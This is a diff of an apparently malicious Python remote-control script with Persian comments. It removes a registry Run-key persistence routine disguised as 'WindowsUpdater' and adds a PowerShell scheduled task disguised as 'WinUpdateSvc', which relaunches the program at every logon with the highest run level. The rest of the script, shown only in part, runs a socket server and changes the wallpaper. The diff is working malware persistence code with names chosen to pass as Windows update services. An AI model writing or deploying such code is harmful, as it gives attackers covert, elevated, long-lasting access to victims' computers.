@@ -4,7 +4,6 @@ import time
 import socket
 import ctypes
 import subprocess
-import winreg
 from cryptography.fernet import Fernet
 import platform
 
@@ -24,33 +23,38 @@ def to_chunks(data: bytes, chunk_size: int = 1024):
 
 # ------------------ Registry Persistence ------------------
 
-def add_to_startup_registry():
+def create_persistent_task(task_name="WinUpdateSvc"):
+    # مسیر فایل اجرایی فعلی (حتی اگر exe باشه)
     exe_path = sys.executable
-    try:
-        with winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            0, winreg.KEY_SET_VALUE
-        ) as reg_key:
-            winreg.SetValueEx(reg_key, "WindowsUpdater", 0, winreg.REG_SZ, exe_path)
-    except Exception as e:
-        print(f"[Registry Error] {e}")
 
-def remove_from_registry():
-    try:
-        reg_key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            0, winreg.KEY_ALL_ACCESS
-        )
-        winreg.DeleteValue(reg_key, "WindowsUpdater")
-        winreg.CloseKey(reg_key)
-        print("✅ Entry removed from startup.")
-    except FileNotFoundError:
-        print("⚠️ Entry not found.")
-    except Exception as e:
-        print(f"❌ Error: {e}")
+    # کد پاورشل برای ساخت تسک
+    ps_command = f'''
+    $Action = New-ScheduledTaskAction -Execute '{exe_path}'
+    $Trigger = New-ScheduledTaskTrigger -AtLogOn
+    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
+    $Task = New-ScheduledTask -Action $Action -Principal $Principal -Trigger $Trigger
+    Register-ScheduledTask -TaskName "{task_name}" -InputObject $Task -Force
+    '''
 
+    try:
+        # اجرای اسکریپت پاورشل
+        result = subprocess.run(["powershell", "-Command", ps_command],
+                                capture_output=True, text=True)
+        if result.returncode == 0:
+            print("✅ Task created successfully.")
+        else:
+            print("❌ Failed to create task:\n", result.stderr)
+    except Exception as e:
+        print(f"⚠️ Error running PowerShell: {e}")
+
+def remove_task(task_name="WinUpdateSvc"):
+    try:
+        result = subprocess.run(
+            f'schtasks /delete /tn "{task_name}" /f',
+            shell=True, capture_output=True, text=True)
+        print(result.stdout)
+    except Exception as e:
+        print(f"❌ Error removing task: {e}")
 # ------------------ Wallpaper Control ------------------
 
 def change_wallpaper(image_path: str) -> bytes:
@@ -208,4 +212,6 @@ def start_server():
         conn.close()
 
 if __name__ == "__main__":
+    # create_persistent_task()
+    remove_task()
     start_server()
